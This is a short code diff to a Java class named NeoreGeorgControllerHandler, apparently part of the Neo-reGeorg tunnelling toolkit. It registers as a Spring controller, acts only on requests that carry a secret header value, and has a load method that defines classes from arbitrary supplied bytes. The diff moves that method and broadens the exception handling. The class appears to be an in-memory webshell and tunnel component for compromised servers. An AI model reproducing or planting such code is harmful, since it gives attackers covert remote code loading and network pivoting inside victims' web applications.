@@ -35,12 +35,6 @@ public class NeoreGeorgControllerHandler extends ClassLoader implements Controll
     }
 
     @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-
-    @SuppressWarnings("all")
     public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
         try {
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
@@ -66,9 +60,15 @@ public class NeoreGeorgControllerHandler extends ClassLoader implements Controll
                 }
                 namespace.get(chars).equals(args);
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
         return null;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
